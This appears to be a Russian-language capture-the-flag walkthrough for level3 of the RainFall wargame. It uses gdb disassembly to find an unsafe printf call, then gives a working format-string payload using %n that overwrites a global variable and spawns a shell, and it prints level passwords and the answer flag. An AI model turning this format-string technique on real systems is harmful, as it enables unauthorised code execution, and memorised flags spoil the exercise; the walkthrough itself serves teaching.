1) Пароль для уровня берем из level2: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
2) level3@RainFall:~$ ltrace ./level3
__libc_start_main(0x804851a, 1, 0xbffff804, 0x8048530, 0x80485a0 <unfinished ...>
fgets(
"\n", 512, 0xb7fd1ac0)                                                           = 0xbffff550
printf("\n"
)                                                                           = 1
+++ exited (status 0) +++

3) Зайдем в gdb ./level3 и посмотрим переменные:
info var -> Интересана глобальная переменная m
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m

4) Посмотрим функции:
info func -> интересные нам main и v.
All defined functions:
Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini

5) (gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave  
   0x08048526 <+12>:    ret    
End of assembler dump.
Видно вызывается функия v

6) (gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave  
   0x08048519 <+117>:   ret    
End of assembler dump.
В 49 строке вызов небозопасной функции printf
В 54 строке mov нашей глобальной переменной и после этого идет сравнение с 0x40 = 64(в десятичной), которое потом приведет нас в 
111 строку

(gdb) x/s 0x804860d
0x804860d:       "/bin/sh" это в 104 строке, значит запускается нужная нам консоль.
То есть нам необходимо сейчас сделать так, чтобы глобальная переменная стала равна 64.

7) У printf есть уязвимость, он дает не только печатать, но и записывать какие-нибудь значения по адресу в памяти с помощью
спецификатора %n, который записывает подаваемый в качестве параметра адрес, количество символов считанных им в формат строке 
до встречи с %n. То что подаем на ввод оказывается внутри форматной строки в виде первого параметра, который
приходит в функцию printf. Потом он разбирает эту форматную строк и пытается вывести обратно и так как существует 
небозопасный спецификатор мы перезаписываем именно то, что нам надо. Перезапишем место переменной m, на то, что надо.

level3@RainFall:~$ ./level3 
0000 %p %p %p %p %p %p
0000 0x200 0xb7fd1ac0 0xb7ff37d0 0x30303030 0x20702520 0x25207025 -> 0x30303030 - четвертый аргумент, это подаваемая
в printf строка и поэтому мы можем в качестве строки подать в него адрес переменной m

python -c "print('\x8c\x98\x04\x08%60d%4\$n')" > /tmp/level3

То есть printf считает форматную строку и в четвертом аргументе у нас будет адрес переменной m, куда он запишет количество 64 символа
до %n. 
level3@RainFall:~$ cat /tmp/level3 - | ./level3
�                                                         512
Wait what?!
pwd
/home/user/level3
cat /home/user/level4/.pass 
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa 

Ответ: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa 